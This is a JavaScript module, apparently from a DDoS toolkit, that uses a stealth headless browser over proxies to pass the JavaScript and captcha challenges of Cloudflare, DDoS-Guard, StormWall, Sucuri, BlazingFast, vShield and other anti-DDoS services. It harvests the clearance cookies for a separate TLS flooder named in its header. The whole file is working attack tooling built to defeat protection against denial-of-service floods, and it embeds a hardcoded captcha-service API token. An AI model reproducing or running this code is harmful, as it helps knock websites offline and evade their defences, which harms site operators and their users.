/*

    ▄▄▄  ·▄▄▄▄• ▐ ▄ 
    ▀▄ █·▪▀·.█▌•█▌▐█
    ▐▀▀▄ ▄█▀▀▀•▐█▐▐▌ 
    ▐█•█▌█▌▪▄█▀██▐█▌
    .▀  ▀·▀▀▀ •▀▀ █▪

                Browser Emulator V2

    Added methods:
    [+] CloudFlare UAM
    [+] DDoS-Guard JS
    [+] vDDoS JS
    [+] CyberDDoS JS
    [+] FrostByte JS
    [+] StormWall Normal & Silent Bypass
    [+] StackPath JS Bypass
    [+] Sucuri Bypass
    [+] BlazingFast v1/v2 JS Bypass 
    [+] vShield JS v1/v2 Bypass

    You'll need a high-end server and fast proxies! 3rd party flooder is using Ch2k1t3 TLS Flooder.

*/

require('events').EventEmitter.defaultMaxListeners = 0;
const puppeteer = require('puppeteer-extra')
const colors = require('colors')
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
function solving(message) {
        return new Promise((resolve,reject) => {
        puppeteer.use(StealthPlugin())
        puppeteer.use(RecaptchaPlugin({
            provider: {
                id:'2captcha',
                token:'5bc598fd4f4b1ef63c83242afbb6ecbf'
            },
            visualFeedback:true
        }))
        puppeteer.launch({
            headless: true,
            args: [
                `--proxy-server=http://${message.proxy}`,
                '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
                '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
                `--window-size=1920,1080`,
                "--window-position=000,000",
                "--disable-dev-shm-usage",
                "--no-sandbox",
              ]
        }).then(async (browser) => {
            console.log(`[Initializing] `.green + `Creating session using proxy: ` + `${message.proxy}`.magenta)
            const page = await browser.newPage()
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.21');
            await page.setJavaScriptEnabled(true);
            await page.setDefaultNavigationTimeout(120000);
            await page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false
                });
            })
            await page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'platform', {
                    get: () => 'Win32'
                });
            })
            /*----------------------------------------DEFS-------------------------------------------*/
            function isCloudflareJSChallenge(html)
            {
                return html.includes('Just a moment...');
            }

            function isStormWall(html)
            {
                return html.includes('<img src="https://static.stormwall.pro/ajax-loader.gif"/>');
            }

            function isStormWallSilent(html)
            {
                return html.includes('<link rel="stylesheet" href="https://static.stormwall.pro/captcha.css">');
            }

            function isDDGChallenge(body) {
                return body.includes('check.ddos-guard.net/check.js');
            }

            function isSucuriChallenge(title)
            {
                return title.includes("You are being redirected...");
            }

            function isvShieldChallenge(body) {
                return body.includes('dl.vshield.pro/ddos/bot-detector.js');
            }

            function isvShieldChallengeV2(body)
            {
                return body.includes('fw.vshield.pro/v2/bot-detector.js');
            }

            function isReactvDDoS(html)
            {
                return html.includes('<script src="/vddosw3data.js"></script>')
            }

            function isFrostByte(html)
            {
                return html.includes('<noscript><meta http-equiv="refresh" content="5"; url=""/>Your browser must support JavaScript, please enable JavaScript or change your browser');
            }

            function isO2Switch(html)
            {
                return html.includes('<div class="o2s-browser-check">');
            }

            function isCyberDDoS(html)
            {
                return html.includes('/cdn-cgi/challenge/v1/xscript.lib');
            }

            function isBlazingFastChallenge(html)
            {
                return html.includes('<br>DDoS Protection by</font> Blazingfast.io</a>');
            }

            function isBlazingFastV2Challenge(html)
            {
                return html.includes('<script src="/bf.jquery.max.js"></script>');
            }

            function isvShieldCaptchaChallenge(html)
            {
                return html.includes('<form action="https://challenge.layer7-protection.xyz/submi>');
            }

            function isBlazingDocElement(body)
            {
                return body.includes('/blzgfst-shark/');
            }

            function ishCaptchaContainer(html)
            {
                return html.includes('#cf-hcaptcha-container');
            }

            /*-------------------------------------------HARVESTER--------------------------------------------------*/

            async function Harvester()
            {
                const cookies = await page.cookies();
                const title = await page.title();
                if (cookies) {
                    console.log(`[Harvester] `.yellow +  `Page Title: `.reset + title.green + ` | Proxy: ` + `${message.proxy}`.magenta)
                    console.log(`[Harvester]`.green + ` Harvesting cookies...`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    console.log(`[Harvester]`.green +  ` Cookies count:`.reset + ` [${cookies.length}]`.yellow)
                    
                    resolve(cookies);
                    await browser.close();
                    return;
                }
            }

            /*-------------------------------------------SOLVERS--------------------------------------------------*/

            async function StormWallSolver(page)
            {
                const html = await page.content();
                if(isStormWall(html) || isStormWallSilent(html))
                {
                    console.log(`[StormWall] `.yellow +  `Found`.reset + ` StormWall `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500});
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    const title = await page.title();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
    
                    if (title != "Your browser cannot be verified automatically, please confirm you are not a robot.") {
                    console.log(`[StormWall] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                    await Harvester();
                    return true;
                }
            }

            async function vDDoSJSSolver(page)
            {
                const html = await page.content();
                if(isReactvDDoS(html))
                {
                    console.log(`[vDDoS] `.yellow +  `Found`.reset + ` vDDoS `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500});
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    const title = await page.title();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
    
                    if (title != "Challenge Failed! vDDoS Security") {
                    console.log(`[vDDoS] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                    await Harvester();
                    return true;
                }
            }

            async function O2SwitchSolver(page)
            {
                const html = await page.content();
                if(isO2Switch(html))
                {
                    console.log(`[o2Switch] `.yellow +  `Found`.reset + ` o2Switch `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500});
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    const title = await page.title();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
    
                    if (title != "Security check...") {
                    console.log(`[o2Switch] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                    await Harvester();
                    return true;
                }
            }

            async function FrostByteSolver(page)
            {
                const html = await page.content();
                if(isFrostByte(html))
                {
                    console.log(`[FrostByte] `.yellow +  `Found`.reset + ` FrostByte `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500});
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    const title = await page.title();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
    
                    if (title != "FROSTBYTE UAM") {
                    console.log(`[FrostByte] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                    await Harvester();
                    return true;
                }
            }

            async function CyberDDoSSolver(page)
            {
                const html = await page.content();
                if(isCyberDDoS(html))
                {
                    console.log(`[CyberDDoS] `.yellow +  `Found`.reset + ` CyberDDoS `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500});
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    const title = await page.title();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
    
                    if (title != "CyberDDoS") {
                    console.log(`[CyberDDoS] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                    await Harvester();
                    return true;
                }
            }

            async function StackPathJSSolver(page) {
        
                await page.waitForNavigation({ waitUntil: 'domcontentloaded' });
                await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                const title = await page.title();
                await page.reload({
                    timeout: '5000',
                    waitUntil: 'domcontentloaded'
                });
                if (title != "StackPath") {
                    console.log(`[StackPath] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
                    await Harvester();
                    return true;
                }
                
                if (title == "Site verification") {
                    console.log(`[StackPath]`.yellow + `Detected Captcha after JS!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    return "captcha";
                }
                if(title == "StackPath") {
                    console.log(`[StackPath]`.yellow + `JS Challenge cannot be bypassed.`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    return "js";
                }
                return true;
            }

            async function CloudFlareJSSolver(page) {
                console.log(`[CloudFlare] `.yellow +  `Found`.reset + ` CloudFlare `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                
                await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 });
                await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                const html = await page.content();
                const title = await page.title();
                if(isCloudflareJSChallenge(html)) {
                    console.log(`[CloudFlare] `.yellow +  `JS Challenge`.reset + ` Unsolved!`.red + ` | Proxy: ` + `${message.proxy}`.magenta)
                    return 'js';
                }
                if(!isCloudflareJSChallenge(html)) {

                console.log(`[CloudFlare] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)

                await page.reload({
                    timeout: '5000',
                    waitUntil: 'domcontentloaded'
                });

                await Harvester();

                return true;
            }
                
            }

            async function SucuriSolver(page)
            {
                const title = await page.title();
                    console.log(`[Sucuri] `.yellow +  `Found`.reset + ` Sucuri `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.waitForNavigation({ waitUntil: 'domcontentloaded' });
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    if(title != "You are being redirected...") 
                    {
                        console.log(`[Sucuri] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                    
            }

            async function BlazingFastJSSolver(page)
            {
                const html = await page.content();
                if(isBlazingFastChallenge(html) || isBlazingDocElement(html) || isBlazingFastV2Challenge(html))
                {
                    console.log(`[BlazingFast] `.yellow +  `Found`.reset + ` BlazingFast `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500});
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    const title = await page.title();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
                    if (title != "Just a moment...") {
                    console.log(`[BlazingFast] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                    await Harvester();
                    return true;
                }
            }

            async function DDGJSChallengeSolver(page)
            {
                    await page.waitForTimeout(1000);

                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500 });

                    const content = await page.content();
                    const DDG_JS = await isDDGChallenge(content);
                    if (!DDG_JS) {
                    console.log(`[DDoS-Guard] `.yellow +  `JS Challenge`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    }
                
            }

            async function hCaptchaContainerSolver(page)
            {
                console.log(`[CloudFlare hCaptcha] `.yellow +  `Found`.reset + ` CloudFlare `.cyan + `hCaptcha Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                const content = await page.content();
                const title = await page.title();
                let SolvingCount = 0;
                try
                {
                    const CloudFlareWrapper = await page.$('#cf-wrapper'); 
                    if (CloudFlareWrapper) {
                        console.log(`[CloudFlare hCaptcha] `.yellow +  `Found`.reset + ` CloudFlare `.cyan + `hCaptcha Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                        await page.waitForTimeout(10000, { waitUntil:'networkidle0' })
                        const hCaptchaContainer = await page.$('#cf-hcaptcha-container');
                        if (hCaptchaContainer) {
                            try {
                                await page.waitForSelector('#cf-hcaptcha-container'); 
                                console.log(`[CloudFlare hCaptcha] `.yellow +  `Trying to solve`.reset + ` hCaptcha Challenge...`.yellow + ` | Proxy: ` + `${message.proxy}`.magenta)
                                SolvingCount = 0;
                                await page.solveRecaptchas();
                            } catch (e) {
                                console.log(`[CloudFlare hCaptcha] `.yellow +  `hCaptcha Container`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                                SolvingCount = 1;
                            }
                        }
                        console.log(`[CloudFlare hCaptcha] `.yellow +  `hCaptcha seems to be`.reset + ` Autosolved!`.green +  ` | Proxy: ` + `${message.proxy}`.magenta)
                        SolvingCount = 1;
                    }
                    await page.waitForTimeout(30000, { waitUntil: 'networkidle0' })
                    const CloudFlareWrapperII = await page.$('#cf-wrapper'); 
                    if (CloudFlareWrapperII) {
                        console.log(`[CloudFlare hCaptcha] `.yellow +  `Found`.reset + ` CloudFlare `.cyan + `hCaptcha Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                        await page.waitForTimeout(10000, { waitUntil:'networkidle0' })
                        const hCaptchaContainer2 = await page.$('#cf-hcaptcha-container');
                        if (hCaptchaContainer2) {
                            try {
                                await page.waitForSelector('#cf-hcaptcha-container'); 
                                console.log(`[CloudFlare hCaptcha] `.yellow +  `Trying to solve`.reset + ` hCaptcha Challenge...`.yellow + ` | Proxy: ` + `${message.proxy}`.magenta)
                                SolvingCount = 0;
                                await page.solveRecaptchas();
                            } catch (e) {
                                console.log(`[CloudFlare hCaptcha] `.yellow +  `hCaptcha Container`.reset + ` Bypassed `.green + `Successfully`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                                SolvingCount = 1;
                            }
                        }
                        console.log(`[CloudFlare hCaptcha] `.yellow +  `hCaptcha seems to be`.reset + ` Autosolved!`.green +  ` | Proxy: ` + `${message.proxy}`.magenta)
                        SolvingCount = 1;
        
                        await page.waitForTimeout(30000, { waitUntil: 'networkidle0' })
                        const CloudFlareWrapperIII = await page.$('#cf-wrapper'); 
                        if (CloudFlareWrapperIII) {
                            await browser.close();
                            reject();
                            return;
                        }
                }
            } catch(e)
            {
                reject(e);
                await browser.close();
            }
            if(SolvingCount == 1)
            {
                await Harvester();
                return true;
            }
            }
            /*------------------------------------------ MAIN -----------------------------------------------*/
            async function AutoSolve()
            {
                const html = await page.content();
                const title = await page.title();
                const cookies = await page.cookies();
                if(isvShieldCaptchaChallenge(html))
                {
                    console.log(`[vShield reCaptcha] `.yellow +  `reCaptcha`.reset + ` Unsupported! Exiting...`.red + ` | Proxy: ` + `${message.proxy}`.magenta)
                    process.exit(1);
                }
                if(ishCaptchaContainer(html) && title == "Please Wait... | Cloudflare")
                {
                    await hCaptchaContainerSolver(page);
                }
                if(isCloudflareJSChallenge(html))
                {
                    await CloudFlareJSSolver(page);
            
                }
                else if(title == "StackPath")
                {

                    console.log(`[StackPath] `.yellow +  `Found`.reset + ` StackPath `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await StackPathJSSolver(page);

                }
                else if(title == "Site verification") {
                    console.log(`[StackPath] `.yellow +  `Found`.reset + ` StackPath `.cyan + `Captcha`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)

                }

                else if(isDDGChallenge(html)) {

                    console.log(`[DDoS-Guard] `.yellow +  `Found`.reset + ` DDoSGuard `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await DDGJSChallengeSolver(page);

                }

                else if(isStormWall(html) || isStormWallSilent(html))
                {
                    await StormWallSolver(page);
                }

                else if(isO2Switch(html))
                {
                    await O2SwitchSolver(page);
                }

                else if(isReactvDDoS(html))
                {
                    await vDDoSJSSolver(page);
                }

                else if(isFrostByte(html))
                {
                    await FrostByteSolver(page);
                }

                else if(isCyberDDoS(html))
                {
                    await CyberDDoSSolver(page);
                }

                else if(isSucuriChallenge(cookies))
                {
                    await SucuriSolver();
                }

                else if(isBlazingFastChallenge(html) || isBlazingDocElement(html))
                {
                    await BlazingFastJSSolver(page);
                }
            
                else if(isvShieldChallenge(html))
                {
                    console.log(`[vShield] `.yellow +  `Found`.reset + ` vShield `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.mouse.move(99, 101);
                    await page.mouse.down();
                    await page.mouse.move(199, 199);
                    await page.mouse.up();
                    await page.mouse.move(200, 200);
                    await page.mouse.down();
                    await page.mouse.move(90, 121);
                    await page.mouse.up();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
                    await Harvester();
                    return true;
                }

                else if(isvShieldChallengeV2(html))
                {
                    console.log(`[vShield] `.yellow +  `Found`.reset + ` vShield `.cyan + `JS Challenge!`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await page.mouse.move(99, 101);
                    await page.mouse.down();
                    await page.mouse.move(199, 199);
                    await page.mouse.up();
                    await page.mouse.move(200, 200);
                    await page.mouse.down();
                    await page.mouse.move(90, 121);
                    await page.mouse.up();
                    await page.reload({
                        timeout: '5000',
                        waitUntil: 'domcontentloaded'
                    });
                    await Harvester();
                    return true;
                }
                else 
                {
                    await page.waitForTimeout(1000, { waitUntil: 'networkidle0' })
                    console.log(`[/] `.yellow +  `Unable to find a protection`.reset + ` | Proxy: ` + `${message.proxy}`.magenta)
                    await Harvester();
                }
            }
            try {
                await page.goto(message.url)
                await AutoSolve();
            } catch (ee) { 
                if(ee.message.includes('ERR_CONNECTION_RESET')) {
                    console.log(`[Handler] `.red +  `ERR_CONNECTION_RESET | Proxy: `.reset + `${message.proxy}`.red)
                    await browser.close();
                }
                else if(ee.message.includes('Navigation timeout')) {
                    console.log(`[Handler] `.red +  `Navigation timeout | Proxy: `.reset + `${message.proxy}`.red)
                    await browser.close();
                }
                else if(ee.message.includes('ERR_PROXY_CONNECTION_FAILED')) {
                    console.log(`[Handler] `.red +  `ERR_PROXY_CONNECTION_FAILED | Proxy: `.reset + `${message.proxy}`.red)
                    await browser.close();
                }
                else if(ee.message.includes('Execution context was destroyed')) {
                    console.log(`[Handler] `.red +  `Execution context destroyed | Proxy: `.reset + `${message.proxy}`.red)
                    await browser.close();
                }
            } finally {
                await browser.close();
            }
        })
    })
}

module.exports = { solving:solving }